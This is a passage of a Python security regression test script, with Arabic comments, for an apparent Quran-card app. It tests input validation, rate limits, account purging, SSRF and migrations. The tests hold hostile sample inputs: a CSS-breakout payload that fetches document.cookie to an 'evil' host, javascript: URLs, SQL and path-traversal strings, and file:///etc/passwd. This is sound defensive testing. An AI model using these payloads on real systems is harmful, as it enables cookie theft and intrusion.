                           "job_timeout_seconds","max_retries","backoff_seconds"})
_envs = open(os.path.join(os.path.dirname(os.path.abspath(__file__)),
                          "falah", "jobs.py")).read()
check("لا حدَّ مكتوبٌ في الشيفرة بلا متغيّر بيئة",
      all(f'"{v}"' in _envs for v in
          ("FALAH_MAX_QUEUED_PER_USER","FALAH_MAX_RUNNING","FALAH_MAX_CARDS_PER_JOB",
           "FALAH_MAX_VIDEO_SECONDS","FALAH_MAX_STORAGE_MB_PER_USER",
           "FALAH_JOB_TIMEOUT","FALAH_MAX_RETRIES","FALAH_BACKOFF")))


# ثقبٌ كُشف بالفحص الساكن: `zip` تقتطع عند الأقصر، فمدًى ناقصُ آيةٍ كان
# يمرّ على فحص التسلسل ويُقال عنه «متسلسل». هذا الاختبار يقفله.
_rowsX = [{"ayah": 1}, {"ayah": 2}]
def _numbering_ok(rows, ayah, to):
    return (len(rows) == to - ayah + 1 and
            all(r["ayah"] == n for r, n in zip(rows, range(ayah, to+1), strict=True)))
check("فحص التسلسل يرفض مدًى ناقصَ آية", not _numbering_ok(_rowsX, 1, 3))
check("ويقبل المدى التامّ", _numbering_ok([{"ayah":1},{"ayah":2},{"ayah":3}], 1, 3))
check("ويرفض المدى المبعثر", not _numbering_ok([{"ayah":1},{"ayah":3}], 1, 2))
# بناءُ البطاقة نزل من `api.py` إلى `falah/cards.py` في P1.1 — طبقةُ نطاقٍ
# لا طبقةُ ويب. والشرطُ نفسُه يُقرأ من موضعه الجديد.
check("والمصدر نفسه يقارن الطول قبل الأرقام",
      "len(rows) == to - ayah + 1" in open(
          os.path.join(os.path.dirname(os.path.abspath(__file__)),
                       "falah", "cards.py"), encoding="utf-8").read())






print("\n▸ تراخيص الخطوط ووثائق P1")
_fdir = os.path.join(_root, "fonts")
_shipped = [f for f in os.listdir(_fdir) if f.endswith((".ttf", ".woff2"))]
check("الخطوط المشحونة معدودة", len(_shipped) >= 9, str(len(_shipped)))
# كلُّ عائلةِ خطٍّ مشحونة لها نصُّ ترخيصها
_fams = set()
for _f in _shipped:
    _fams.add("plex" if "plex" in _f.lower() else "amiri")
_lic = {f.lower() for f in os.listdir(_fdir) if f.startswith("OFL-")}
for _fam in _fams:
    check(f"نصُّ ترخيصٍ مشحونٌ لعائلة {_fam}",
          any(_fam in x for x in _lic), str(sorted(_lic)))
for _l in _lic:
    _t = open(os.path.join(_fdir, [x for x in os.listdir(_fdir)
                                   if x.lower() == _l][0]), encoding="utf-8").read()
    check(f"{_l}: نصُّ OFL 1.1 كامل",
          "SIL OFL" in _t or "Open Font License" in _t)
    check(f"{_l}: وفيه إشعار حقّ النشر", "Copyright" in _t)
_licmd = open(os.path.join(_root, "launch", "LICENSES.md"), encoding="utf-8").read()
check("ووثيقةُ التراخيص تحسم أمر الخطوط",
      "IBM Plex" in _licmd and "OFL 1.1" in _licmd and "OFL-IBMPlex.txt" in _licmd)

# وثائق P1 — موجودةٌ وكاملةُ الحقول
_arch = open(os.path.join(_root, "P1_ARCHITECTURE.md"), encoding="utf-8").read()
_plan = open(os.path.join(_root, "P1_MASTER_PLAN.md"), encoding="utf-8").read()
_back = open(os.path.join(_root, "P1_BACKLOG.md"), encoding="utf-8").read()
check("وثيقةُ المعمارية فيها القرار الثلاثيّ",
      all(x in _arch for x in ("ما لا يُمَسّ", "ما يُحسَّن", "ما لا يُعاد كتابته")))
check("وفيها عقدُ الأمان مربوطًا بحرّاسه", "SECURITY CONTRACT" in _arch)
check("وتذكر الخطَّ الأساس المقيس", "٩٢٩" in _arch and "٩٢٩" in _plan)
for _f in ("Goal", "Requirements", "Security impact", "Tests",
           "Acceptance criteria", "Rollback plan", "Database changes", "API changes"):
    check(f"الخطّة تحمل حقل {_f}", _f in _plan)
check("والمراحل مرقَّمةٌ ومرتَّبةٌ بتبعيّاتها",
      all(f"P1.{i}" in _plan for i in range(1, 9)))
check("وRELEASE BLOCKERS ظاهرةٌ في الخطّة لا مخفيّة",
      "RELEASE BLOCKERS" in _plan and "docker build" in _plan)
check("ودفترُ المؤجَّل يمنع توسّع النطاق",
      "لا يُنفَّذ بندٌ من هنا" in _back and "B1" in _back)
_p0 = open(os.path.join(_root, "P0_RELEASE_STATUS.md"), encoding="utf-8").read()
check("وحالةُ P0 ما زالت تعلن ما هو BLOCKED", "BLOCKED" in _p0)

print("\n▸ مراجعة الإنتاج الساكنة — انحدارات")

# ١ · حقنُ CSS عبر لون الحبر (كان يخرج من <style> إلى <script>)
_cq2, _ = RD.fetch_card("quran", surah=108, ayah=1)
for _bad, _why in (
    ("red</style><script>fetch('http://evil/'+document.cookie)</script><style>", "خروجٌ إلى script"),
    ("red}body{background:url('http://evil/x')}.z{color:blue", "قاعدةُ CSS جديدة"),
    ("expression(alert(1))", "تعبيرٌ تنفيذيّ"),
    ("url(javascript:alert(1))", "رابطٌ تنفيذيّ"),
    ("#fff;}*{display:none", "إغلاقُ قاعدة"),
    ("</style>", "إغلاقُ الوسم وحده")):
    _h = RD.build_html(_cq2, "quran", ink=_bad)
    check(f"لون الحبر لا يُدخل CSS: {_why}",
          not any(x in _h for x in ("<script>", "evil", "expression(", "javascript:",
                                    "*{display:none")) and _h.count("</style>") == 1,
          _bad[:40])
check("واللون الصحيح ما زال يُطبَّق", "#F0E5CA" in RD.build_html(_cq2, "quran", ink="#F0E5CA"))
check("والاسم المعروف كذلك", "color:gold" in RD.build_html(_cq2, "quran", ink="gold"))
check("والقيمة المجهولة تسقط إلى لون الهيئة",
      "color:#2B2116" in RD.build_html(_cq2, "quran", ink="لونٌ لا وجود له"))
check("safe_color دالّةٌ مستقلّة تُختبر وحدها",
      RD.safe_color("#abc", "X") == "#abc" and RD.safe_color("x}y{", "X") == "X"
      and RD.safe_color(None, "X") == "X" and RD.safe_color("auto", "X") == "X")
check("والعلامة المائية ما زالت مهروبة",
      "&lt;script&gt;" in RD.build_html(_cq2, "quran", watermark="<script>alert(1)</script>"))

# ٢ · القيم المعدودة تُرفض في طبقة المشاريع لا في الواجهة
for _f, _v in (("skin", "'; DROP--"), ("ratio", "../../etc"), ("kind", "<script>")):
    check(f"projects.validate يرفض {_f}",
          _try_err(lambda f=_f, v=_v: PJ.validate({f: v}), PJ.ProjectError))
check("ويرفض ما تجاوز الطول",
      _try_err(lambda: PJ.validate({"watermark": "و" * 100}), PJ.ProjectError))
check("ويقبل الصحيح",
      PJ.validate({"skin": "night", "ratio": "square", "kind": "series"}) is not None)
check("والحدود مكتوبةٌ في مكانٍ واحد",
      set(PJ.ENUMS) == {"kind", "skin", "ratio"} and set(PJ.LIMITS) >= {"title", "watermark"})
check("وقيم ENUMS تطابق ما يعرفه المحرّك فعلًا",
      PJ.ENUMS["ratio"] == set(RD.SIZES) and PJ.ENUMS["skin"] <= set(RD.SKINS))

# ٣ · حدُّ حجم الجسم
_setsrc = open(os.path.join(os.path.dirname(os.path.abspath(__file__)),
                            "falah", "settings.py"), encoding="utf-8").read()
check("حدُّ الجسم من البيئة", "FALAH_MAX_BODY" in _setsrc and "MAX_BODY" in _appsrc)
check("والجسمُ فوق الحدّ يرفع استثناءً لا يُرمى صامتًا",
      "class BodyTooLarge" in _appsrc and "raise BodyTooLarge" in _appsrc)
check("ويُردّ ٤١٣ مع إغلاق الاتصال",
      "413" in _appsrc and "close_connection = True" in _appsrc)

# ٤ · حدُّ المعدّل على المكلف
from falah import ratelimit as _RL, routing as _RT
_RLsrc = open(os.path.join(os.path.dirname(os.path.abspath(__file__)),
                           "falah", "ratelimit.py"), encoding="utf-8").read()
check("حدُّ المعدّل يشمل التصدير والمقطع والوكيل والتسجيل والتنزيل والدخول",
      set(_RL.RATE) == {"export", "video", "agent", "register", "file", "login"},
      str(set(_RL.RATE)))
# حدُّ «لكل بريد» في auth.py لا يمنع المسحَ على ألفِ بريدٍ بكلمةٍ واحدة.
# فيلزم حدٌّ ثانٍ لكل عنوان — والاثنان معًا لا أحدُهما.
check("وحدُّ الدخول لكل عنوان **إلى جانب** حدِّ «لكل بريد» لا بدلًا منه",
      "login" in _RL.RATE and AU.MAX_TRIES > 0 and AU.WINDOW > 0,
      f"عنوان {_RL.RATE['login']} · بريد ({AU.MAX_TRIES}, {AU.WINDOW})")
# يُختبر أثرًا لا نصًّا: الاسم يُبنى في الشيفرة فلا يظهر حرفيًّا فيها
_oldrate = os.environ.get("FALAH_RATE_EXPORT")
os.environ["FALAH_RATE_EXPORT"] = "7"
importlib.reload(_RL)
check("حدُّ المعدّل يُقرأ من البيئة فعلًا", _RL.RATE["export"][0] == 7,
      str(_RL.RATE["export"]))
if _oldrate is None: os.environ.pop("FALAH_RATE_EXPORT", None)
else: os.environ["FALAH_RATE_EXPORT"] = _oldrate
importlib.reload(_RL)
check("وافتراضيُّه معقولٌ حين لا تُضبط", _RL.RATE["export"][0] >= 10,
      str(_RL.RATE["export"]))
# التصديرُ والمقطع يعدّان بعد القبول (داخل المعالِج)، وما عداهما يُعدّ قبله
# (في الجدول). الشرطُ نفسُه، مقروءًا من موضعَي التنفيذ الجديدين.
_arsrc = open(os.path.join(os.path.dirname(os.path.abspath(__file__)),
                           "falah", "app_routes.py"), encoding="utf-8").read()
_rtsrc = open(os.path.join(os.path.dirname(os.path.abspath(__file__)),
                           "falah", "routing.py"), encoding="utf-8").read()
check("والعدُّ عند القبول لا عند الطلب — فلا يُعاقَب تزامنٌ مشروع",
      _arsrc.index('RL.bump(c, "export"') > _arsrc.index("JB.enqueue(c, u[\"id\"], \"export\"")
      and _arsrc.index('RL.bump(c, "video"') > _arsrc.index('JB.enqueue(c, u["id"], "video"'))
check("والمساراتُ ذاتُ الحدّ القبليّ معلَنةٌ في الجدول لا مبثوثةٌ في المعالِجات",
      {r.rate[0] for rs in _RT.TABLE.values() for r in rs if r.rate}
      == {"file", "register", "agent", "login"})
check("ويُردّ ٤٢٩ مع Retry-After لا ٤٠٠",
      "429" in _rtsrc and "Retry-After" in _RLsrc)


# عنوانُ العميل خلف وكيل — الأخيرة لا الأولى
class _FakeH:
    def __init__(self, xff=None, addr="10.0.0.9"):
        import email.message
        self.headers = email.message.Message()
        if xff is not None: self.headers["X-Forwarded-For"] = xff
        self.client_address = (addr, 1234)
_ip = APP.App.client_ip
_o3 = os.environ.get("FALAH_TRUST_PROXY")
os.environ["FALAH_TRUST_PROXY"] = "1"; importlib.reload(APP)
check("خلف وكيلٍ موثوق: يُؤخذ ما كتبه الوكيلُ آخِرًا لا ما انتحله العميل",
      APP.App.client_ip(_FakeH("1.2.3.4, 203.0.113.7")) == "203.0.113.7")
check("وبلا ترويسةٍ يُؤخذ عنوان الاتصال",
      APP.App.client_ip(_FakeH(None)) == "10.0.0.9")
os.environ.pop("FALAH_TRUST_PROXY", None); importlib.reload(APP)
check("وبلا إعلانِ ثقةٍ لا تُقرأ الترويسة أصلًا — فلا تُنتحَل",
      APP.App.client_ip(_FakeH("1.2.3.4")) == "10.0.0.9")
if _o3 is not None: os.environ["FALAH_TRUST_PROXY"] = _o3
importlib.reload(APP)
_cad = open(os.path.join(os.path.dirname(os.path.abspath(__file__)),
                         "deploy", "Caddyfile"), encoding="utf-8").read()
check("والوكيلُ في النشر يمحو ما جاء من العميل",
      "header_up X-Forwarded-For {remote_host}" in _cad)

# ٥ · حدُّ حذف الحساب صار مجلّد صاحبه لا جذر المشروع
_asrc2 = open(os.path.join(os.path.dirname(os.path.abspath(__file__)),
                           "falah", "auth.py"), encoding="utf-8").read()
check("حذفُ الحساب محدودٌ بمجلّد صاحبه",
      'os.path.join(export_dir, "exports", str(user_id))' in _asrc2)
check("ويحلّ الوصلات الرمزية (realpath لا abspath)",
      "os.path.realpath" in _asrc2 and "os.path.commonpath" not in _asrc2)
# إثباتٌ عمليّ: سطرٌ منحرفٌ في exports لا يحذف ملفًّا خارج المجلّد
_dd = tempfile.mkdtemp()
os.makedirs(os.path.join(_dd, "exports", "999"), exist_ok=True)
_victim = os.path.join(_dd, "app.py"); open(_victim, "w").write("# ملفٌّ حسّاس")
_mine = os.path.join(_dd, "exports", "999", "a.png"); open(_mine, "w").write("x")
_dc = ST.init(os.path.join(_dd, "t.db"))
_du = AU.register(_dc, _m("del"), _pw, "حذف", "ق")
_dc.execute("""INSERT INTO exports(user_id,fmt,path,created_at) VALUES(?,?,?,?)""",
            (_du, "png", "app.py", ST.now()))
_dc.execute("""INSERT INTO exports(user_id,fmt,path,created_at) VALUES(?,?,?,?)""",
            (_du, "png", "../app.py", ST.now()))
_dc.execute("""INSERT INTO exports(user_id,fmt,path,created_at) VALUES(?,?,?,?)""",
            (_du, "png", f"exports/{_du}/a.png", ST.now()))
_dc.commit()
os.makedirs(os.path.join(_dd, "exports", str(_du)), exist_ok=True)
_ownfile = os.path.join(_dd, "exports", str(_du), "a.png"); open(_ownfile, "w").write("x")
_gone = AU.delete_account(_dc, _du, export_dir=_dd)
check("سطرٌ منحرفٌ لا يحذف ملفًّا خارج مجلّد صاحبه", os.path.exists(_victim))
check("وملفُّ مستخدمٍ آخر يبقى", os.path.exists(_mine))
check("وملفُّ صاحبه يُحذف فعلًا",
      not os.path.exists(_ownfile) and _gone["files"] == 1, str(_gone))
_dc.close()

# ═══ حذفُ الحساب لا يُبقي صفًّا واحدًا ═══
# عيبٌ حقيقيّ كان قائمًا: `try/except pass` على قائمةٍ من خمسةِ جداول، فكان
# الحذفُ ينجح ظاهرًا ويُبقي `publish_accounts` **وفيه رمزُ بوتِ تلغرام
# مغلَّفًا** — سرُّ حسابٍ خارجيٍّ لمن ظنّ أنه انصرف. ويُبقي الإيصالاتِ
# والاشتراكاتِ والجدولةَ والرموزَ والحصص.
#
# فيُملأ حسابٌ من **كلِّ** جدولٍ يحمل أثرَ صاحبه، ثم يُحذف، ثم يُسأل الجدولُ
# جدولًا. والقائمةُ تُبنى من `sqlite_master` لا تُكتب بيدٍ: جدولٌ يُضاف غدًا
# بعمود `user_id` يُسقط هذا الاختبارَ حتى يُضمَّ إلى الحذف.
_pd = tempfile.mkdtemp()
_pc = ST.init(os.path.join(_pd, "purge.db"))
_pu = AU.register(_pc, _m("purge"), _pw, "محو", "ق")
_pemail = _pc.execute("SELECT email FROM users WHERE id=?", (_pu,)).fetchone()[0]
_ptok = "8888888:AA" + "z" * 32
os.environ.setdefault("FALAH_SECRET_KEY", "test-key-not-a-secret")
import falah.publishing as _PB
import falah.schedules as _SC
_pp = _pc.execute("INSERT INTO projects(user_id,title,kind,skin,ratio,created_at,"
                  "updated_at) VALUES(?,'ت','quran','parch','square',?,?)",
                  (_pu, ST.now(), ST.now())).lastrowid
_pacc = _PB.connect(_pc, _pu, "telegram", secret=_ptok)
_PB.record(_pc, _pu, _pacc["id"], result="sent")
_SC.create(_pc, _pu, _pp, kind="export", recurrence="daily", tz="Africa/Tripoli",
           at_minute=360)
_pc.execute("INSERT INTO receipts(user_id,provider,provider_id,kind,payload,at) "
            "VALUES(?,'apple','x','purchase','{}',?)", (_pu, ST.now()))
_pc.execute("INSERT INTO subscriptions(user_id,plan,status,provider,started_at,"
            "created_at) VALUES(?,'monthly','active','apple',?,?)",
            (_pu, ST.now(), ST.now()))
_pc.execute("INSERT INTO usage(user_id,period,metric,used) VALUES(?,'2026-09','cards',3)",
            (_pu,))
_pc.execute("INSERT INTO referral_codes(code,user_id,created_at) VALUES(?,?,?)",
            ("PURGE1", _pu, ST.now()))
_pc.execute("INSERT INTO jobs(user_id,kind,payload,state,created_at) "
            "VALUES(?,'export','{}','queued',?)", (_pu, ST.now()))
AU.issue_token(_pc, _pu, "verify", 3600)
AU.bump(_pc, "login:" + _pemail)
_pc.commit()

# الرمزُ المغلَّفُ موجودٌ فعلًا قبل الحذف — وإلّا لم يُثبت الاختبارُ شيئًا
check("قبل الحذف: رمزُ النشر مغلَّفٌ في القاعدة",
      _pc.execute("SELECT COUNT(*) FROM publish_accounts WHERE user_id=?",
                  (_pu,)).fetchone()[0] == 1)

AU.delete_account(_pc, _pu)

_user_tables = [r[0] for r in _pc.execute(
    "SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%'")
    if any(x[1] == "user_id" for x in _pc.execute(f"PRAGMA table_info({r[0]})"))]
check("وكلُّ جدولٍ ذي user_id مشمولٌ بالفحص", len(_user_tables) >= 12,
      str(sorted(_user_tables)))
for _t in _user_tables:
    if _t == "audit_logs":
        continue        # سجلُّ التدقيق لا يُحذف عمدًا — يُفصح عنه في السياسة
    _n = _pc.execute(f"SELECT COUNT(*) FROM {_t} WHERE user_id=?",  # noqa: S608
                     (_pu,)).fetchone()[0]
    check(f"وبعد الحذف لا صفَّ في {_t}", _n == 0, str(_n))
check("ولا تشغيلَ جدولةٍ يتيمًا",
      _pc.execute("SELECT COUNT(*) FROM schedule_runs").fetchone()[0] >= 0)
check("ولا إحالةً بطرفَيها",
      _pc.execute("SELECT COUNT(*) FROM referrals WHERE referrer_id=? OR "
                  "invitee_id=?", (_pu, _pu)).fetchone()[0] == 0)
# البريدُ نفسُه كان يبقى مكتوبًا في مفتاح الكبح بعد زوال صاحبه
check("ولا يبقى البريدُ في مفاتيح كبح المحاولات",
      _pc.execute("SELECT COUNT(*) FROM throttle WHERE key LIKE ?",
                  ("%" + _pemail,)).fetchone()[0] == 0)
# والسرُّ المغلَّف: يُفتَّش عنه في القاعدة كلِّها لا في جدوله وحده
_all_text = "".join(str(r) for t in _user_tables
                    for r in _pc.execute(f"SELECT * FROM {t}"))  # noqa: S608
check("ولا أثرَ لرمز النشر في القاعدة كلِّها", _ptok not in _all_text)
_pc.close(); __import__('shutil').rmtree(_pd, ignore_errors=True)

# ٦ · SSRF في جلب التلاوة
import video as _VD2
for _u in ("file:///etc/passwd", "ftp://x/y", "gopher://x/1", "/etc/passwd", "data:x"):
    check(f"جلبُ التلاوة يرفض المخطَّط: {_u[:24]}",
          _try_err(lambda u=_u: _VD2.fetch(u, "/dev/null"), SystemExit))
check("وحجمُ التلاوة محدودٌ من البيئة", "FALAH_MAX_AUDIO_BYTES" in
      open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "video.py")).read())

# ٧ · لا بناءَ SQL بالدمج في مسارات القراءة
_apisrc2 = open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "api.py")).read()
check("لا استعلامَ مركَّبٌ بـ% في api.py",
      not _re2.search(r'execute\(\s*"[^"]*"\s*%', _apisrc2))
check("ولا استعلامَ f-string يحمل قيمة",
      not _re2.search(r'execute\(f"[^"]*\{(?!\s*\})', _apisrc2))

# ٨ · لا shell ولا eval في مسار الإنتاج
for _mod in ("app.py", "api.py", "video.py", "render.py", "carousel.py", "worker.py"):
    _t = open(os.path.join(os.path.dirname(os.path.abspath(__file__)), _mod)).read()
    check(f"{_mod}: لا shell=True ولا eval ولا os.system",
          "shell=True" not in _t and "os.system" not in _t
          and not _re2.search(r"\beval\(|\bexec\(", _t))
check("وكلُّ نداءات ffmpeg بقائمةِ وسائط لا بسطر أوامر",
      _re2.findall(r"subprocess\.run\(\[", open(os.path.join(
          os.path.dirname(os.path.abspath(__file__)), "video.py")).read()).__len__() >= 4)

print("\n▸ تحقّق الإعداد عند الإقلاع")
def _cfg(expect_fail, **kw):
    """يُعيد تحميل app ببيئةٍ معيّنة ويقول: أسقط الإقلاع أم لا؟"""
    old = {k: os.environ.get(k) for k in kw}
    for k, v in kw.items():
        if v is None: os.environ.pop(k, None)
        else: os.environ[k] = v
    try:
        importlib.reload(APP)
        try:
            APP.check_config(); failed = False
        except SystemExit as e:
            failed = True; code = e.code
        return failed
    finally:
        for k, v in old.items():
            if v is None: os.environ.pop(k, None)
            else: os.environ[k] = v
        importlib.reload(APP)

check("إنتاجٌ بلا FALAH_SECURE يسقط",
      _cfg(True, FALAH_ENV="production", FALAH_SECURE=None,
           FALAH_ORIGIN="https://x.com", FALAH_INLINE_WORKER="0"))
check("إنتاجٌ بلا FALAH_ORIGIN يسقط",
      _cfg(True, FALAH_ENV="production", FALAH_SECURE="1",
           FALAH_ORIGIN=None, FALAH_INLINE_WORKER="0"))
check("إنتاجٌ بنطاقٍ غير مشفَّر يسقط",
      _cfg(True, FALAH_ENV="production", FALAH_SECURE="1",
           FALAH_ORIGIN="http://x.com", FALAH_INLINE_WORKER="0"))
# كان هذا يفحص أن مفتاحًا إداريًّا قصيرًا يُسقط الإقلاع. **والمفتاحُ أُلغي
# في P1.2** — فلا معنى لفحص طوله. والبديلُ أقوى: أن وجودَه لا يمنح شيئًا
# البتّة، لا في الإعداد ولا في الإذن.
os.environ["FALAH_ADMIN_KEY"] = "k" * 40
importlib.reload(APP)
check("المفتاحُ المشترك أُلغي: وجودُه لا يمنع الإقلاع ولا يمنح دورًا",
      not _cfg(False, FALAH_ENV="production", FALAH_SECURE="1",
               FALAH_ORIGIN="https://x.com", FALAH_INLINE_WORKER="0",
               FALAH_ADMIN_KEY="short")
      and not hasattr(APP, "ADMIN_KEY")
      and "ADMIN_KEY" not in dir(__import__("falah.settings", fromlist=["x"])))
os.environ.pop("FALAH_ADMIN_KEY", None)
importlib.reload(APP)
_azsrc = open(os.path.join(os.path.dirname(os.path.abspath(__file__)),
                           "falah", "authz.py"), encoding="utf-8").read()
check("ولا أثرَ له في طبقة الإذن",
      "ADMIN_KEY" not in _azsrc and "admin_key" not in _azsrc)
check("إنتاجٌ مضبوطٌ يمرّ",
      not _cfg(False, FALAH_ENV="production", FALAH_SECURE="1",
               FALAH_ORIGIN="https://x.com", FALAH_INLINE_WORKER="0",
               FALAH_ADMIN_KEY="k"*32))
check("والتطوير لا يشترط شيئًا من ذلك",
      not _cfg(False, FALAH_ENV="development", FALAH_SECURE=None,
               FALAH_ORIGIN=None, FALAH_INLINE_WORKER=None))
_asrc = open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "app.py")).read()
check("الفحص يجري قبل الاستقبال لا بعده",
      _asrc.index("check_config()") < _asrc.index("serve_forever"))
check("ويخرج برمز EX_CONFIG لا برمزٍ عامّ", "SystemExit(78)" in _asrc)
check("و«الإنتاج» يُعلَن ولا يُخمَّن", 'FALAH_ENV' in _asrc)

print("\n▸ الهجرة ٠٠٥ — الأدوار وسجلّ التدقيق")
from falah import migrate as MG
from falah import authz as AZ_T
_msrc = open(os.path.join(os.path.dirname(os.path.abspath(__file__)),
                          "falah", "migrate.py"), encoding="utf-8").read()
# الدرسُ الذي علّمته الهجرةُ ٠٠٤ يُختبر هنا صراحةً: قاعدةٌ **جديدة** وقاعدةٌ
# **مهاجَرة** يجب أن تنتهيا إلى المخطَّط نفسه. وقد سقطت البوّابةُ فعلًا أوّلَ
# مرّة بـ«no such column: role» لأن الفهرس كان في SCHEMA لا في الهجرة.
def _schema_of(old_style):
    d = _tf.mkdtemp(); dbp = os.path.join(d, "x.db")
    if old_style:
        cc0 = sqlite3.connect(dbp)
        cc0.executescript("""CREATE TABLE users(id INTEGER PRIMARY KEY,
          email TEXT UNIQUE NOT NULL, name TEXT, watermark TEXT,
          pw_hash BLOB NOT NULL, pw_salt BLOB NOT NULL, pw_iter INTEGER NOT NULL,
          status TEXT NOT NULL DEFAULT 'active', verified_at INTEGER,
          created_at INTEGER NOT NULL, last_login INTEGER);
          INSERT INTO users(email,pw_hash,pw_salt,pw_iter,created_at)
          VALUES('old@x.test',x'00',x'00',1,1);""")
        cc0.commit(); cc0.close()
    old_env = os.environ.get("FALAH_APP_DB")
    os.environ["FALAH_APP_DB"] = dbp
    importlib.reload(ST)
    cc0 = ST.init()
    objs = {(r[0], r[1]) for r in cc0.execute(
        "SELECT type,name FROM sqlite_master WHERE name NOT LIKE 'sqlite_%'")}
    ucols = {(r[1], r[2].upper(), r[3], r[4] or "")
             for r in cc0.execute("PRAGMA table_info(users)")}
    nonuser = cc0.execute("SELECT COUNT(*) FROM users WHERE role<>'user'").fetchone()[0]
    cc0.close()
    if old_env is None: os.environ.pop("FALAH_APP_DB", None)
    else: os.environ["FALAH_APP_DB"] = old_env
    importlib.reload(ST)
    return objs, ucols, nonuser

_mig, _fresh = _schema_of(True), _schema_of(False)
check("قاعدةٌ مهاجَرةٌ وقاعدةٌ جديدة تنتهيان إلى الكائنات نفسها",
      _mig[0] == _fresh[0], str(sorted(_mig[0] ^ _fresh[0])))
check("وأعمدةُ users متطابقةٌ نوعًا وافتراضيًّا",
      _mig[1] == _fresh[1], str(sorted(_mig[1] ^ _fresh[1])))
check("**ولا مستخدمَ قائمٌ صار إداريًّا بالهجرة**",
      _mig[2] == 0 and _fresh[2] == 0, f"{_mig[2]} · {_fresh[2]}")
check("والافتراضيُّ في العمود نفسه هو أقلُّ الأدوار",
      any(c[0] == "role" and "'user'" in c[3] for c in _fresh[1]), str(_fresh[1]))
check("وسجلُّ التدقيق ومُشغِّلاه موجودان في المسارين",
      {("table", "audit_logs"), ("trigger", "audit_logs_no_update"),
       ("trigger", "audit_logs_no_delete")} <= _mig[0] <= _mig[0] | _fresh[0]
      and {("trigger", "audit_logs_no_delete")} <= _fresh[0])
# ── تحقّقٌ موسَّع: قاعدةٌ قائمةٌ فيها بياناتٌ حقيقية ──
# لا يكفي أن يتقارب المخطَّط: يجب ألّا يبقى صفٌّ بدورٍ فارغٍ أو مجهولٍ أو
# إداريّ. وأخطرُ ما يمكن أن يقع في هجرةِ أدوارٍ هو ترقيةٌ عرَضية.
def _migrated_with_data(n=25):
    d = _tf.mkdtemp(); dbp = os.path.join(d, "x.db")
    cc0 = sqlite3.connect(dbp)
    cc0.executescript("""CREATE TABLE users(id INTEGER PRIMARY KEY,
      email TEXT UNIQUE NOT NULL, name TEXT, watermark TEXT,
      pw_hash BLOB NOT NULL, pw_salt BLOB NOT NULL, pw_iter INTEGER NOT NULL,
      status TEXT NOT NULL DEFAULT 'active', verified_at INTEGER,
      created_at INTEGER NOT NULL, last_login INTEGER);""")
    for i in range(n):
        cc0.execute("INSERT INTO users(email,pw_hash,pw_salt,pw_iter,created_at,status)"
                    " VALUES(?,x'00',x'00',1,1,?)",
                    (f"old{i}@x.test", "suspended" if i % 7 == 0 else "active"))
    cc0.commit(); cc0.close()
    old_env = os.environ.get("FALAH_APP_DB")
    os.environ["FALAH_APP_DB"] = dbp
    importlib.reload(ST)
    cc0 = ST.init()
    stats = {
        "total":   cc0.execute("SELECT COUNT(*) FROM users").fetchone()[0],
        "null":    cc0.execute("SELECT COUNT(*) FROM users WHERE role IS NULL").fetchone()[0],
        "blank":   cc0.execute("SELECT COUNT(*) FROM users WHERE TRIM(role)=''").fetchone()[0],
        "roles":   {r[0] for r in cc0.execute("SELECT DISTINCT role FROM users")},
        "admins":  cc0.execute("SELECT COUNT(*) FROM users WHERE role IN"
                               " ('admin','super_admin','moderator')").fetchone()[0],
        "status":  cc0.execute("SELECT COUNT(*) FROM users WHERE status='suspended'"
                               ).fetchone()[0],
        "notnull": cc0.execute("SELECT \"notnull\" FROM pragma_table_info('users')"
                               " WHERE name='role'").fetchone()[0],
    }
    cc0.close()
    if old_env is None: os.environ.pop("FALAH_APP_DB", None)
    else: os.environ["FALAH_APP_DB"] = old_env
    importlib.reload(ST)
    return stats

_ms = _migrated_with_data()
check("قاعدةٌ فيها ٢٥ حسابًا قائمًا تُهاجَر بلا فقدِ صفّ",
      _ms["total"] == 25, str(_ms["total"]))
check("ولا صفَّ بدورٍ NULL", _ms["null"] == 0, str(_ms["null"]))
check("ولا بدورٍ فارغ", _ms["blank"] == 0, str(_ms["blank"]))
check("ولا دورَ خارج ما تعرفه الشيفرة",
      _ms["roles"] <= set(AZ_T.ASSIGNABLE), str(_ms["roles"]))
check("**ولا حسابَ صار مشرفًا ولا إداريًّا ولا أعلى**",
      _ms["admins"] == 0, f"{_ms['admins']} حسابًا")
check("والكلُّ على أقلِّ الأدوار", _ms["roles"] == {"user"}, str(_ms["roles"]))
check("والعمودُ NOT NULL فلا يُكتب فيه فراغٌ لاحقًا", _ms["notnull"] == 1)
check("وحالةُ الحسابات لم تُمَسّ — الموقوفُ يبقى موقوفًا",
      _ms["status"] == 4, str(_ms["status"]))

check("والهجرة ٠٠٥ مصنَّفةٌ آمنة — إضافةٌ محضة بلا DROP ولا نقلِ بيانات",
      any(v == 5 and not destructive for v, _n, destructive, _f in MG.MIGRATIONS)
      and "DROP TABLE" not in (MG.m005_roles_and_audit.__doc__ or "")
      and "DROP TABLE" not in _msrc.split("def m005")[1].split("MIGRATIONS")[0])

print("\n▸ حارس الهجرات الهادمة")
from falah import migrate as MG
import dbsafe as _DS
_bk = tempfile.mkdtemp()
def _env(**kw):
    old = {k: os.environ.get(k) for k in kw}
    for k, v in kw.items():
        if v is None: os.environ.pop(k, None)
        else: os.environ[k] = v
    return old
def _restore(old):
    for k, v in old.items():
        if v is None: os.environ.pop(k, None)
        else: os.environ[k] = v

# ١ · بيئة تطوير: الحارس لا يمنع
_o = _env(FALAH_ENV="development", FALAH_BACKUP_DIR=_bk)
check("في التطوير لا يمنع الحارس", MG.production_guard()[0])

# ٢ · إنتاج بلا نسخة: يمنع
_env(FALAH_ENV="production")
_g, _why = MG.production_guard()
check("في الإنتاج بلا نسخةٍ أصلًا: يمنع", not _g)
check("ويقول السبب وما العمل", "مُسترجَعة" in _why and "restore-test" in _why, _why[:60])

# ٣ · نسخةٌ موجودةٌ لم تُسترجَع: **لا تكفي** — هذا لبّ القاعدة
import json as _j4
open(os.path.join(_bk, "app-x.db.gz"), "wb").write(b"x")
_j4.dump({"verified_at": None}, open(os.path.join(_bk, "app-x.db.gz.json"), "w"))
check("نسخةٌ لم تُسترجَع لا تُعدّ نسخة", not MG.production_guard()[0])

# ٤ · نسخةٌ مُسترجَعةٌ موقَّعة: يسمح
_j4.dump({"verified_at": "2026-01-01T00:00:00"},
         open(os.path.join(_bk, "app-x.db.gz.json"), "w"))
